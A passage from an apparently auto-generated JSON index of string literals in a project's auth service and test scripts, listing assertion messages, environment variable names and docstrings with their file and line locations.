        "auth_service/tests/test_critical_staging_database_failures.py:367"
      ]
    },
    "PRIORITY FAILURES (Critical/High)": {
      "value": "PRIORITY FAILURES (Critical/High)",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:236"
      ]
    },
    "PR_NUMBER": {
      "value": "PR_NUMBER",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:34"
      ]
    },
    "PYTEST_CURRENT_TEST": {
      "value": "PYTEST_CURRENT_TEST",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:26"
      ]
    },
    "PYTHONPATH": {
      "value": "PYTHONPATH",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:48",
        "auth_service/tests/test_auth_startup_integration.py:49",
        "auth_service/tests/test_auth_startup_integration.py:49",
        "auth_service/tests/test_auth_startup_integration.py:51"
      ]
    },
    "Parallel Efficiency:": {
      "value": "Parallel Efficiency:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:352"
      ]
    },
    "Parallel Safe:": {
      "value": "Parallel Safe:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:900"
      ]
    },
    "Parallel:": {
      "value": "Parallel:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:365"
      ]
    },
    "Pass Rate:": {
      "value": "Pass Rate:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:298"
      ]
    },
    "Passed": {
      "value": "Passed",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:360"
      ]
    },
    "Passed:": {
      "value": "Passed:",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:93",
        "scripts/test_auth_database_sessions.py:397",
        "scripts/test_coordination_fixes.py:380",
        "scripts/test_database_url_builder_comprehensive.py:348",
        "scripts/test_example_message_flow.py:321",
        "scripts/test_ssl_certificates_staging.py:305",
        "scripts/test_staging_env.py:189",
        "scripts/test_staging_migrations.py:325",
        "scripts/test_verify_workflow_status_corrected.py:195",
        "scripts/test_websocket_dev_mode.py:296"
      ]
    },
    "Password Hashing Basic Tests - Business Impact\n\nSecurity Foundation: User Account Protection\n- Ensures secure password hashing for all local authentication flows\n- Validates password verification accuracy and prevents authentication bypasses  \n- Critical foundation for user account security and authentication integrity\n\nTechnical Excellence:\n- Hash uniqueness: ensures each password hash is unique preventing rainbow table attacks\n- Verification accuracy: tests both correct and incorrect password scenarios\n- Format consistency: validates Argon2id format and security parameters\n- Edge case handling: tests malformed inputs and boundary conditions\n- Performance validation: ensures hashing/verification completes in reasonable time\n- Concurrent safety: validates thread-safe password operations for production scalability\n\nPlatform Security:\n- Foundation: Secure password handling foundation for all local user authentication\n- Security: Comprehensive hashing validation prevents password-related vulnerabilities\n- Performance: Fast verification ensures responsive authentication experience  \n- Reliability: Edge case testing ensures robust password handling in production\n- Integrity: Hash format validation maintains cryptographic security standards": {
      "value": "Password Hashing Basic Tests - Business Impact\n\nSecurity Foundation: User Account Protection\n- Ensures secure password hashing for all local authentication flows\n- Validates password verification accuracy and prevents authentication bypasses  \n- Critical foundation for user account security and authentication integrity\n\nTechnical Excellence:\n- Hash uniqueness: ensures each password hash is unique preventing rainbow table attacks\n- Verification accuracy: tests both correct and incorrect password scenarios\n- Format consistency: validates Argon2id format and security parameters\n- Edge case handling: tests malformed inputs and boundary conditions\n- Performance validation: ensures hashing/verification completes in reasonable time\n- Concurrent safety: validates thread-safe password operations for production scalability\n\nPlatform Security:\n- Foundation: Secure password handling foundation for all local user authentication\n- Security: Comprehensive hashing validation prevents password-related vulnerabilities\n- Performance: Fast verification ensures responsive authentication experience  \n- Reliability: Edge case testing ensures robust password handling in production\n- Integrity: Hash format validation maintains cryptographic security standards",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:258"
      ]
    },
    "Password changed": {
      "value": "Password changed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:153"
      ]
    },
    "Password hash should use Argon2id variant": {
      "value": "Password hash should use Argon2id variant",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:103"
      ]
    },
    "Password hashing took too long:": {
      "value": "Password hashing took too long:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:203"
      ]
    },
    "Password is missing from staging DATABASE_URL": {
      "value": "Password is missing from staging DATABASE_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:76"
      ]
    },
    "Password must contain at least one digit": {
      "value": "Password must contain at least one digit",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:84"
      ]
    },
    "Password must contain at least one lowercase letter": {
      "value": "Password must contain at least one lowercase letter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:81"
      ]
    },
    "Password must contain at least one special character": {
      "value": "Password must contain at least one special character",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:87"
      ]
    },
    "Password must contain at least one uppercase letter": {
      "value": "Password must contain at least one uppercase letter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:78"
      ]
    },
    "Password required for local auth": {
      "value": "Password required for local auth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:72"
      ]
    },
    "Password too long": {
      "value": "Password too long",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:426"
      ]
    },
    "Password too short: minimum": {
      "value": "Password too short: minimum",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:75"
      ]
    },
    "Password verification should fail for wrong password:": {
      "value": "Password verification should fail for wrong password:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:94"
      ]
    },
    "Password verification should succeed": {
      "value": "Password verification should succeed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:210"
      ]
    },
    "Password verification should succeed for:": {
      "value": "Password verification should succeed for:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:68"
      ]
    },
    "Password verification took too long:": {
      "value": "Password verification took too long:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:211"
      ]
    },
    "Password:": {
      "value": "Password:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:48"
      ]
    },
    "Pattern check results:": {
      "value": "Pattern check results:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:117"
      ]
    },
    "Perform OAuth operation that uses Redis/memory store": {
      "value": "Perform OAuth operation that uses Redis/memory store",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:292"
      ]
    },
    "Perform analysis without making changes": {
      "value": "Perform analysis without making changes",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:719"
      ]
    },
    "Perform dry run without making changes (SAFE, default)": {
      "value": "Perform dry run without making changes (SAFE, default)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:920"
      ]
    },
    "Perform ultra-thinking deep analysis": {
      "value": "Perform ultra-thinking deep analysis",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:72"
      ]
    },
    "Performance Grade:": {
      "value": "Performance Grade:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:331"
      ]
    },
    "Performance Simulator\n\nThis module simulates performance patterns including cascading failures and bottlenecks.": {
      "value": "Performance Simulator\n\nThis module simulates performance patterns including cascading failures and bottlenecks.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:1"
      ]
    },
    "Performance and SLA validation tests": {
      "value": "Performance and SLA validation tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:98"
      ]
    },
    "Performance benchmark tests": {
      "value": "Performance benchmark tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:102"
      ]
    },
    "PerformanceSimulator": {
      "value": "PerformanceSimulator",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/__init__.py:85"
      ]
    },
    "PerformanceTest123!": {
      "value": "PerformanceTest123!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:195"
      ]
    },
    "Permission Test Data Factory\nCreates test permission data for role-based access control testing.\nSupports various permission patterns and user permission assignments.": {
      "value": "Permission Test Data Factory\nCreates test permission data for role-based access control testing.\nSupports various permission patterns and user permission assignments.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:1"
      ]
    },
    "PermissionFactory": {
      "value": "PermissionFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:19"
      ]
    },
    "PermissionRequest schema does not default to staging": {
      "value": "PermissionRequest schema does not default to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:120"
      ]
    },
    "Permissions must be a list": {
      "value": "Permissions must be a list",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:211"
      ]
    },
    "Phase": {
      "value": "Phase",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:279"
      ]
    },
    "Please check test configuration.": {
      "value": "Please check test configuration.",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:359"
      ]
    },
    "Please review failures before deploying.": {
      "value": "Please review failures before deploying.",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:362"
      ]
    },
    "Please review the failed tests and fix the issues": {
      "value": "Please review the failed tests and fix the issues",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:424"
      ]
    },
    "Please review violations manually and implement proper solutions.": {
      "value": "Please review violations manually and implement proper solutions.",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:388"
      ]
    },
    "Please start PostgreSQL with:": {
      "value": "Please start PostgreSQL with:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:158"
      ]
    },
    "Pool size:": {
      "value": "Pool size:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:322"
      ]
    },
    "Pool size: 5, Max overflow: 10": {
      "value": "Pool size: 5, Max overflow: 10",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:318"
      ]
    },
    "Port allocation test failed:": {
      "value": "Port allocation test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:182"
      ]
    },
    "Port allocation working: service1=": {
      "value": "Port allocation working: service1=",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:173"
      ]
    },
    "Port:": {
      "value": "Port:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:233",
        "scripts/test_ssl_certificates_staging.py:40",
        "scripts/test_ssl_certificates_staging.py:61",
        "scripts/test_ssl_certificates_staging.py:216",
        "scripts/test_staging_db_direct.py:45",
        "scripts/test_staging_migrations.py:45"
      ]
    },
    "Post-deployment:": {
      "value": "Post-deployment:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:221"
      ]
    },
    "PostgreSQL Async Configuration Test": {
      "value": "PostgreSQL Async Configuration Test",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:125"
      ]
    },
    "PostgreSQL container not available:": {
      "value": "PostgreSQL container not available:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:70"
      ]
    },
    "PostgreSQL version:": {
      "value": "PostgreSQL version:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:70",
        "auth_service/test_staging_db_connection.py:208"
      ]
    },
    "PostgresDB": {
      "value": "PostgresDB",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:368"
      ]
    },
    "Postgres_Db": {
      "value": "Postgres_Db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:366"
      ]
    },
    "Potential circular dependencies detected": {
      "value": "Potential circular dependencies detected",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:621"
      ]
    },
    "Pre-deployment error": {
      "value": "Pre-deployment error",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:114"
      ]
    },
    "Pre-deployment validation failures:": {
      "value": "Pre-deployment validation failures:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:409"
      ]
    },
    "Pre-deployment:": {
      "value": "Pre-deployment:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:220"
      ]
    },
    "Predictable OAUTH_HMAC_SECRET not detected: '": {
      "value": "Predictable OAUTH_HMAC_SECRET not detected: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:328"
      ]
    },
    "Preferred splitting strategy": {
      "value": "Preferred splitting strategy",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:680"
      ]
    },
    "Priority failures:": {
      "value": "Priority failures:",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:227"
      ]
    },
    "Priority:": {
      "value": "Priority:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:879"
      ]
    },
    "Problematic files found in excluded directories:": {
      "value": "Problematic files found in excluded directories:",
      "category": "test_literals",
      "locations": [
        "scripts/test_exclusion_check.py:38"
      ]
    },
    "Process a specific file": {
      "value": "Process a specific file",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:723"
      ]
    },
    "Process integration tests first (default: True)": {
      "value": "Process integration tests first (default: True)",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:725"
      ]
    },
    "Processed": {
      "value": "Processed",
      "category": "test_literals",
      "locations": [
        "scripts/remove_duplicate_test_setup.py:63"
      ]
    },
    "Processed:": {
      "value": "Processed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:381"
      ]
    },
    "Processing": {
      "value": "Processing",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:643",
        "scripts/auto_fix_test_sizes.py:653",
        "scripts/standardize_l3_test_names.py:266"
      ]
    },
    "Processing Batch": {
      "value": "Processing Batch",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:240"
      ]
    },
    "Processing complete!": {
      "value": "Processing complete!",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:206"
      ]
    },
    "Processing first": {
      "value": "Processing first",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:261"
      ]
    },
    "Processing specific file:": {
      "value": "Processing specific file:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:686"
      ]
    },
    "Processing:": {
      "value": "Processing:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:261",
        "scripts/standardize_l3_test_names.py:160"
      ]
    },
    "Production Environment": {
      "value": "Production Environment",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:150"
      ]
    },
    "Productivity Gain:": {
      "value": "Productivity Gain:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:330"
      ]
    },
    "Progress display mode (default: simple)": {
      "value": "Progress display mode (default: simple)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:824"
      ]
    },
    "Progress:": {
      "value": "Progress:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:255"
      ]
    },
    "Project root directory": {
      "value": "Project root directory",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:775",
        "scripts/ci/check_test_stubs.py:112",
        "scripts/remove_test_stubs.py:361"
      ]
    },
    "Project root:": {
      "value": "Project root:",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:71"
      ]
    },
    "Project-Only Real Test Requirements Validator\n\nValidates only project test files against SPEC/testing.xml real test requirements.\nExcludes virtual environments and external libraries.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns in our code\n- Strategic Impact: Ensures test reliability and system integrity": {
      "value": "Project-Only Real Test Requirements Validator\n\nValidates only project test files against SPEC/testing.xml real test requirements.\nExcludes virtual environments and external libraries.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns in our code\n- Strategic Impact: Ensures test reliability and system integrity",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:1"
      ]
    },
    "Proposed new files:": {
      "value": "Proposed new files:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:98"
      ]
    },
    "Protects": {
      "value": "Protects",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:490"
      ]
    },
    "Protocol": {
      "value": "Protocol",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:211",
        "scripts/remove_test_stubs.py:223"
      ]
    },
    "Provider server error": {
      "value": "Provider server error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:264"
      ]
    },
    "Provider states should be isolated": {
      "value": "Provider states should be isolated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:191"
      ]
    },
    "Provider unavailable": {
      "value": "Provider unavailable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:755"
      ]
    },
    "Python files to process": {
      "value": "Python files to process",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:196"
      ]
    },
    "QUALITY METRICS:": {
      "value": "QUALITY METRICS:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:745"
      ]
    },
    "Quick Test": {
      "value": "Quick Test",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:406"
      ]
    },
    "Quick frontend test runner that handles no-tests case properly": {
      "value": "Quick frontend test runner that handles no-tests case properly",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_quick.py:2"
      ]
    },
    "Quick script to run tests against the actual staging environment.\n\nUsage:\n    python scripts/test_staging.py           # Run all staging tests\n    python scripts/test_staging.py --quick   # Run quick health checks only\n    python scripts/test_staging.py --full    # Run comprehensive staging tests": {
      "value": "Quick script to run tests against the actual staging environment.\n\nUsage:\n    python scripts/test_staging.py           # Run all staging tests\n    python scripts/test_staging.py --quick   # Run quick health checks only\n    python scripts/test_staging.py --full    # Run comprehensive staging tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:2"
      ]
    },
    "Quick script to verify that test scanning is excluding site-packages and virtual environments": {
      "value": "Quick script to verify that test scanning is excluding site-packages and virtual environments",
      "category": "test_literals",
      "locations": [
        "scripts/test_exclusion_check.py:2"
      ]
    },
    "Quick smoke tests for basic functionality": {
      "value": "Quick smoke tests for basic functionality",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:78"
      ]
    },
    "Quick test failure scanner - identifies failing tests efficiently": {
      "value": "Quick test failure scanner - identifies failing tests efficiently",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:2"
      ]
    },
    "Quick validation test": {
      "value": "Quick validation test",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:403"
      ]
    },
    "Quick validation tests (<30s)": {
      "value": "Quick validation tests (<30s)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:23"
      ]
    },
    "RATE_LIMITING_ENABLED": {
      "value": "RATE_LIMITING_ENABLED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:58",
        "auth_service/tests/config/test_settings.py:182"
      ]
    },
    "READY": {
      "value": "READY",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:145"
      ]
    },
    "REAL_LLM": {
      "value": "REAL_LLM",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:304"
      ]
    },
    "RECOMMENDATION": {
      "value": "RECOMMENDATION",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:73"
      ]
    },
    "RECOMMENDATION:": {
      "value": "RECOMMENDATION:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:54"
      ]
    },
    "RECOMMENDATIONS:": {
      "value": "RECOMMENDATIONS:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:102",
        "scripts/business_value_test_index.py:764",
        "scripts/compliance/fake_test_scanner.py:304"
      ]
    },
    "REDIS_DB": {
      "value": "REDIS_DB",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:35",
        "auth_service/tests/config/test_settings.py:173"
      ]
    },
    "REDIS_DISABLED": {
      "value": "REDIS_DISABLED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:44",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:227"
      ]
    },
    "REDIS_HOST": {
      "value": "REDIS_HOST",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:33",
        "auth_service/tests/config/test_settings.py:171"
      ]
    },
    "REDIS_PORT": {
      "value": "REDIS_PORT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:34",
        "auth_service/tests/config/test_settings.py:172"
      ]
    },
    "REDIS_URL": {
      "value": "REDIS_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:32",
        "auth_service/tests/config/test_env.py:164",
        "auth_service/tests/config/test_env.py:173",
        "auth_service/tests/config/test_env.py:183",
        "auth_service/tests/config/test_env.py:194",
        "auth_service/tests/config/test_settings.py:170",
        "auth_service/tests/conftest.py:34",
        "auth_service/tests/integration/test_redis_connection_failover.py:48",
        "auth_service/tests/integration/test_redis_connection_failover.py:84",
        "auth_service/tests/integration/test_redis_connection_failover.py:109"
      ]
    },
    "REDUNDANT TEST": {
      "value": "REDUNDANT TEST",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:67"
      ]
    },
    "REFRESH_TOKEN_EXPIRE_DAYS": {
      "value": "REFRESH_TOKEN_EXPIRE_DAYS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:25",
        "auth_service/tests/config/test_settings.py:179"
      ]
    },
    "REGION": {
      "value": "REGION",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:200"
      ]
    },
    "RESULTS": {
      "value": "RESULTS",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:261"
      ]
    },
    "RS256": {
      "value": "RS256",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:80",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:182"
      ]
    },
    "RUNNING FRONTEND UNIT TESTS": {
      "value": "RUNNING FRONTEND UNIT TESTS",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:55"
      ]
    },
    "RUNNING REAL E2E TESTS:": {
      "value": "RUNNING REAL E2E TESTS:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:149"
      ]
    },
    "RUNNING SIMPLIFIED UNIT TESTS": {
      "value": "RUNNING SIMPLIFIED UNIT TESTS",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:36"
      ]
    },
    "Rate limit exceeded": {
      "value": "Rate limit exceeded",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:113"
      ]
    },
    "Rate limiting and DDoS protection tests": {
      "value": "Rate limiting and DDoS protection tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:108"
      ]
    },
    "React\\.createContext\\(\\w*mock\\w*\\)": {
      "value": "React\\.createContext\\(\\w*mock\\w*\\)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:68"
      ]
    },
    "Readiness endpoint returned status": {
      "value": "Readiness endpoint returned status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:156"
      ]
    },
    "Readiness separation test failed:": {
      "value": "Readiness separation test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:153"
      ]
    },
    "Readiness vs health separation working correctly": {
      "value": "Readiness vs health separation working correctly",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:149"
      ]
    },
    "Real LLM Coverage:": {
      "value": "Real LLM Coverage:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:747"
      ]
    },
    "Real Service Test Metrics Tracking\nULTRA DEEP THINK: Module-based architecture - Metrics tracking extracted for 450-line compliance": {
      "value": "Real Service Test Metrics Tracking\nULTRA DEEP THINK: Module-based architecture - Metrics tracking extracted for 450-line compliance",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:2"
      ]
    },
    "Real Test Requirements Linter\n\nIntegrates into development workflow to enforce real test requirements.\nCan be used as pre-commit hook, CI check, or standalone validation.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents test anti-patterns from entering codebase\n- Strategic Impact: Maintains test reliability and system integrity\n\nUsage:\n  python scripts/compliance/real_test_linter.py [--fix] [--strict] [file1 file2 ...]\n  \nOptions:\n  --fix     Attempt to automatically fix violations\n  --strict  Fail on any violations (for CI)\n  --files   Specific files to check (default: all project test files)": {
      "value": "Real Test Requirements Linter\n\nIntegrates into development workflow to enforce real test requirements.\nCan be used as pre-commit hook, CI check, or standalone validation.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents test anti-patterns from entering codebase\n- Strategic Impact: Maintains test reliability and system integrity\n\nUsage:\n  python scripts/compliance/real_test_linter.py [--fix] [--strict] [file1 file2 ...]\n  \nOptions:\n  --fix     Attempt to automatically fix violations\n  --strict  Fail on any violations (for CI)\n  --files   Specific files to check (default: all project test files)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:2"
      ]
    },
    "Real Test Requirements Validator\n\nValidates test files against SPEC/testing.xml real test requirements:\n1. No mock component implementations inside test files\n2. Integration tests use real child components  \n3. Files must not exceed 300 lines\n4. Functions must not exceed 8 lines\n5. Minimal mocking (only external APIs)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns\n- Strategic Impact: Ensures test reliability and system integrity": {
      "value": "Real Test Requirements Validator\n\nValidates test files against SPEC/testing.xml real test requirements:\n1. No mock component implementations inside test files\n2. Integration tests use real child components  \n3. Files must not exceed 300 lines\n4. Functions must not exceed 8 lines\n5. Minimal mocking (only external APIs)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns\n- Strategic Impact: Ensures test reliability and system integrity",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:1"
      ]
    },
    "Realistic Test Data Models and Configuration\n\nThis module defines models, enums, and configuration data for realistic test data generation.": {
      "value": "Realistic Test Data Models and Configuration\n\nThis module defines models, enums, and configuration data for realistic test data generation.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:1"
      ]
    },
    "Realistic Test Data Service\n\nBackward compatibility module that imports from the new modular structure.\nGenerates production-like test data for comprehensive testing.\nAddresses gaps identified in test_realism_analysis_20250811.md": {
      "value": "Realistic Test Data Service\n\nBackward compatibility module that imports from the new modular structure.\nGenerates production-like test data for comprehensive testing.\nAddresses gaps identified in test_realism_analysis_20250811.md",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data_service.py:1"
      ]
    },
    "Realistic Test Data Service Module\n\nGenerates production-like test data for comprehensive testing.\nThis module addresses gaps identified in test realism analysis and provides\nrealistic patterns for LLM responses, logs, workloads, and performance scenarios.": {
      "value": "Realistic Test Data Service Module\n\nGenerates production-like test data for comprehensive testing.\nThis module addresses gaps identified in test realism analysis and provides\nrealistic patterns for LLM responses, logs, workloads, and performance scenarios.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/__init__.py:1"
      ]
    },
    "Realistic test data module - consolidates test data functionality.": {
      "value": "Realistic test data module - consolidates test data functionality.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/realistic_test_data.py:1"
      ]
    },
    "RealisticDataPatterns": {
      "value": "RealisticDataPatterns",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/__init__.py:80",
        "netra_backend/app/services/realistic_test_data_service.py:27"
      ]
    },
    "RealisticTestDataConfigManager": {
      "value": "RealisticTestDataConfigManager",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/__init__.py:81"
      ]
    },
    "RealisticTestDataService": {
      "value": "RealisticTestDataService",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/realistic_test_data.py:8",
        "netra_backend/app/services/realistic_test_data/__init__.py:79",
        "netra_backend/app/services/realistic_test_data_service.py:27"
      ]
    },
    "Reason:": {
      "value": "Reason:",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:179",
        "scripts/test_error_monitor_logic.py:203"
      ]
    },
    "Received response:": {
      "value": "Received response:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:209"
      ]
    },
    "Recommendation: Manually refactor based on these suggestions.": {
      "value": "Recommendation: Manually refactor based on these suggestions.",
      "category": "test_literals",
